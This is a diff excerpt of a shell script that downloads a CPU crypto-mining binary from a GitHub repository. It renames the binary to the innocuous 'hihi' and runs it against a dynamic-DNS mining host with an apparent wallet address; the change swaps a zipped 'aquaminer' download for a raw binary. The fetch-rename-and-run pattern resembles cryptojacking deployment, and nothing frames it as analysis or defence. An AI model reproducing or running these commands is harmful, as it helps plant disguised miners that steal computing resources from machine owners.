@@ -27,8 +27,7 @@ fi
 exit
 fi
 
-wget https://github.com/StupidmanTan/miner-cpu/raw/master/kaka.zip
-unzip kaka.zip
-mv aquaminer-0.4-linux-amd64 hihi
+wget https://github.com/StupidmanTan/miner-cpu/raw/master/aqua
+mv aqua hihi
 ./hihi -F http://kaquashaki.ddns.net//0x6f392f86702e358b16074ad635f9b273b44972c1/ggc
 exit 0
